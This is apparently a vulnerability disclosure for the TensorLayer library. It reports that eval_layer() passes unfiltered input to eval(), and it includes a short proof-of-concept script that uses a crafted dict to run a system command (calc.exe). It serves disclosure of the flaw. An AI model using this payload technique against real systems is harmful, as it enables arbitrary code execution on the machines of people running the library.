## :writing_hand: Description

`TensorLayer` is a novel TensorFlow-based deep learning and reinforcement learning library designed for researchers and engineers. It provides an extensive collection of customizable neural layers to build advanced AI models quickly. This package is vulnerable to `Arbitrary Code Execution`.

## :bug: Vulnerability

Use of `eval()` in `eval_layer()` function without filtering causes execution of system commands

## :male_detective: Proof of Concept

#### Installation
```bash
pip install tensorflow
pip install tensorlayer
```

#### Run exploit.py
```python
from tensorlayer.files.utils import eval_layer

eval_layer({'class': 'utils.np.os.execvp', 'args': {'layer_type': 'normal', 'file': 'calc.exe', 'args': ['0']}})
```
